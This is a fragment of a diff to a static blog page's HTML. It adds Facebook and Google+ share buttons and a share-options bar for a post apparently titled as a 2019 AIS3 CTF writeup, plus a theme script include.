+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/2019-ais3-ctf-writeup/" title="分享到 Facebook">
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/2019-ais3-ctf-writeup/" title="分享到 Google+">
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/2019-ais3-ctf-writeup/">
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/2019-ais3-ctf-writeup/">
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
             
         </div>
         
@@ -856,6 +505,8 @@
         <!--SCRIPTS-->
 <script src="/assets/js/script-dbd16rvloemmuxdzniplmnxxvwoz24eya9wol0b7vvmlokgqsjivmb8dnscy.min.js"></script>
 <!--SCRIPTS END--><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+    
 
 
 
